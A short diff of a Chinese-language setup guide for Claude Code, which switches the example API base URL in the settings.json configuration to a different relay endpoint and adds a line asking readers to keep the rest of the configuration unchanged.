@@ -57,7 +57,7 @@ Claude Code 会从 `~/.claude/settings.json` 读取配置。如果 `~/.claude/` 
 {
   "env": {
     "ANTHROPIC_API_KEY": "YOUR_API_KEY",
-    "ANTHROPIC_BASE_URL": "https://cc.freemodel.dev",
+    "ANTHROPIC_BASE_URL": "https://relayhub.chrisley.site/claude-code/v1",
     "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1"
   },
   "permissions": {
@@ -68,7 +68,7 @@ Claude Code 会从 `~/.claude/settings.json` 读取配置。如果 `~/.claude/` 
 }
 ```
 
-把两处 `YOUR_API_KEY` 都替换为步骤 02 中复制的密钥。
+把两处 `YOUR_API_KEY` 都替换为步骤 02 中复制的密钥，其余配置保持不变。
 
 ## 步骤 05：启动客户端
 
